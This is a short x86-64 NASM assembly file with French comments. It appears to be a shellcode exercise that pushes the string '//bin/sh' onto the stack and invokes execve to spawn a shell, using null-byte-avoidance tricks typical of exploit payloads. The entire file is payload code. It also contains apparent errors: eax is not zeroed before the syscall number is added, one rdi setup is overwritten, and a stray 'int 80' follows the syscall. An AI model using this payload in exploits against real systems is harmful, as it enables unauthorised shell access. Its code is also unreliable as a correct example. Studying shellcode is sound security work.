BITS 64

section .data

section .text
global _start

_start:
    ; 59 opcode
    ; int execve(char *fname, char **argp, char **envp);

push 0xFF 
pop rdi 
sub rdi, 0xFF 

mov rdx, 0xFF 
sub rdx, 0xFF
xor rsi, rsi
mov rdi, 0x68732f6e69622f2f
    push rdx            ; délimiteur de stack à 0
    push rdi            ; insertion chaine /bin/sh en stack
    mov rdi, rsp        ; insertion du pointeur de stack dans rdi
    push rdx            ; délimiteur de stack à 0
    push rdi            ; insertion du pointeur dans la stack
    mov rsi, rsp        ; récupération du pointeur de pointeur et mise dans rsi
    
    add eax, 59        ;execve opcode

    syscall
    int 80            ;interupt